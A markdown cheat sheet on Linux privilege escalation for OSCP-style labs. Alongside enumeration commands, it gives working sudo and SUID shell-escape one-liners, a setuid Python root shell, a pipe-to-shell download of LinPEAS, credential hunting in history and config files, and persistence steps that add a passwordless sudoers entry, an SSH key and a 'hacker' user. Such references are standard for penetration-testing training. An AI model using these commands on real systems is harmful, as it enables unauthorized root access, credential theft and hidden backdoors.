# Linux Privilege Escalation

Essential techniques for escalating privileges on Linux systems during OSCP.

## Quick Enumeration

### System Info
```bash
# Kernel and OS info
uname -a
cat /etc/issue
cat /etc/*-release

# CPU info
cat /proc/cpuinfo

# Memory info
free -h
```

### User Info
```bash
# Current user
id
whoami

# Other users
cat /etc/passwd
cat /etc/group

# Sudo privileges
sudo -l

# SUID files
find / -perm -4000 -type f 2>/dev/null
```

### Network Info
```bash
# Network config
ifconfig -a
ip a

# Network connections
netstat -tulpn
ss -tulpn

# Firewall rules
iptables -L
```

## Common Vectors

### Sudo Abuse
```bash
# Check sudo permissions
sudo -l

# If allowed to run specific commands:
sudo find / -exec /bin/sh \; -quit
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
```

### SUID Binaries
```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Known vulnerable SUIDs:
# - nmap (--interactive)
# - find (exec)
# - vim/vi
# - bash
# - less/more
# - nano
# - cp/mv

# Example with find:
find / -name test -exec /bin/sh \;
```

### World-Writable Files
```bash
# Find world-writable files
find / -writable -type f 2>/dev/null
find / -perm -2 -type f 2>/dev/null

# World-writable directories
find / -type d -perm -2 2>/dev/null
```

### Cron Jobs
```bash
# List cron jobs
ls -la /etc/cron*
ls -la /etc/cron*/*

# Check crontab
crontab -l
ls -la /var/spool/cron/crontabs/
```

### Capabilities
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Example: If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Automated Tools

### LinPEAS
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# If no curl/wget:
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Linux Exploit Suggester
```bash
# Download and run
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh
```

## Kernel Exploits

### Common Kernel Exploits
- DirtyCow (CVE-2016-5195)
- DirtyPipe (CVE-2022-0847)
- PwnKit (CVE-2021-4034)
- Sudo Baron Samedit (CVE-2021-3156)

### Check Kernel Version
```bash
uname -a
cat /proc/version
```

## Password Hunting

### History Files
```bash
# Check command history
cat ~/.bash_history
cat ~/.zsh_history

# Check other users' history
ls -la /home/*/.bash_history
```

### Config Files
```bash
# Look for passwords in config files
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /home/ 2>/dev/null
```

### SSH Keys
```bash
# Look for SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

## Container Escapes

### Check for Container
```bash
# Check if in a container
ls -la /.dockerenv
cat /proc/1/cgroup
```

### Common Escapes
- Mounted Docker Socket
- Privileged Container
- Kernel Exploits

## Post-Exploitation

### Add New User
```bash
# Add user to sudoers
echo "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Or add to sudo group
usermod -aG sudo username
```

### SSH Backdoor
```bash
# Add SSH key to authorized_keys
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Or create new user with SSH access
useradd -m -s /bin/bash hacker
passwd hacker
usermod -aG sudo hacker
```

## Quick Checks
1. **sudo -l**: Check sudo permissions
2. **SUID Files**: Find setuid binaries
3. **Cron Jobs**: Check for writable cron jobs
4. **Capabilities**: Check for dangerous capabilities
5. **Kernel**: Check for kernel exploits
6. **Passwords**: Check history and config files

## Practice
- HTB: Shocker, Nibbles
- TryHackMe: Linux Privesc
